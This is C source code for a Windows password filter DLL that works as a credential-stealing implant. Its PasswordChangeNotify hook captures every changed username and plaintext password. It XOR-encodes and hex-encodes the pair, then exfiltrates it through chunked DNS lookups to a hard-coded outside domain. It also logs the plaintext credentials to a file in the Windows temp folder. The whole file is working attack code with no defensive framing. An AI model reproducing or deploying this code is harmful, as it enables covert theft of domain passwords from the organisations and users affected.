#include "stdafx.h"
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <Subauth.h>
#include <stdint.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define key    "key"
#define domain ".ns1.0rwell.com"

#define MAX_LABEL_SIZE 62

FILE   *pFile;
struct addrinfo hints;
struct addrinfo *result;

// Default DllMain implementation
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	OutputDebugString(L"DllMain");
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

__declspec(dllexport) BOOLEAN WINAPI InitializeChangeNotify(void)
{
	//Initialize file for Debug
	errno_t test = fopen_s(&pFile, "c:\\windows\\temp\\logFile.txt", "w+");

	//Initialize Winsock
	errno_t err;
	WSADATA wsaData;
	err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (err != 0) {
		return -1;
	}

	//Initialize variables for getaddrinfo call
	result = NULL;
	struct addrinfo *ptr = NULL;

	//Initialize hints
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_protocol = IPPROTO_UDP;
	hints.ai_socktype = SOCK_DGRAM;

	return TRUE;
}

__declspec(dllexport) BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}

__declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
	//Format data to send (UserName:Password)
	SIZE_T dataSize = (UserName->Length / 2) + (NewPassword->Length / 2) + 2; // 1 for ':' and the other for nullbyte
	PSTR   rawData  = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE)*dataSize);

	snprintf(rawData, dataSize, "%wZ:%wZ", UserName, NewPassword);

	//XOR data with key
	SIZE_T xorSize = dataSize - 1; // {-1} -> Will not encode the nullbyte
	PSTR xor = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * xorSize);

	DWORD keyLength = (DWORD)strlen(key);

	for (int i = 0; i < xorSize; i++) {
		xor[i] = (PSTR)(rawData[i] ^ key[i % keyLength]);
	}

	fprintf(pFile, "RawData: ");

	for (int i = 0; i < dataSize; i++) {
		fprintf(pFile, "%c", rawData[i]);
	}

	fprintf(pFile, "\n");
	GlobalFree(rawData);

	//Format to Hex so no illegal chars are in the DNS query
	SIZE_T hexSize = (xorSize * 2) + 1;
	PSTR   hexData = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * hexSize);

	for (int i = 0; i < xorSize; i++) {
		snprintf(hexData + i * 2, hexSize, "%02x", xor[i]);
	}

	GlobalFree(xor);
	fprintf(pFile, "Hex: ");

	for (int i = 0; i < hexSize; i++) {
		fprintf(pFile, "%c", hexData[i]);
	}

	fprintf(pFile, "\n");

	DWORD lenData = 0;

	for (int i = 0; i < (hexSize / (FLOAT) MAX_LABEL_SIZE); i++) { //Divide data into multiple requests if neccessary

		if ((i + 1) * MAX_LABEL_SIZE <= hexSize) {
			lenData = MAX_LABEL_SIZE;
		} 
		else 
		{
			lenData = (hexSize - 1) % MAX_LABEL_SIZE;
			if (lenData == 0) {
				break;
			}
		}

		//Select portion of data to be sent
		PSTR queryData;
		queryData = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * lenData);

		for (int j = 0; j < lenData; j++) {
			queryData[j] = hexData[i * MAX_LABEL_SIZE + j];
		}

		//Prepare query (requestNumber.data.domain.com)
		PSTR query;
		SIZE_T querySize = 2 + lenData + strlen(domain);

		query = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * querySize);
		
		query[0] = i + '0'; //Append request number
		query[1] = 46;

		for (int j = 0; j < lenData; j++) { //Append data
			query[j + 2] = queryData[j];
		}

		GlobalFree(queryData);

		for (int j = 0; j < strlen(domain); j++) { //Append domain
			query[j + 2 + lenData] = domain[j];
		}

		query[querySize] = '\0'; //Append nullbyte
		fprintf(pFile, "Query: ");

		for (int q = 0; q < querySize; q++) {
			fprintf(pFile, "%c", query[q]);
		}

		fprintf(pFile, "\n");

		//Send request
		DWORD returnValue = getaddrinfo(query, "53", &hints, &result);

		GlobalFree(query);
	}

	GlobalFree(hexData);

	//End
	WSACleanup();
	fclose(pFile);

	return 0;
}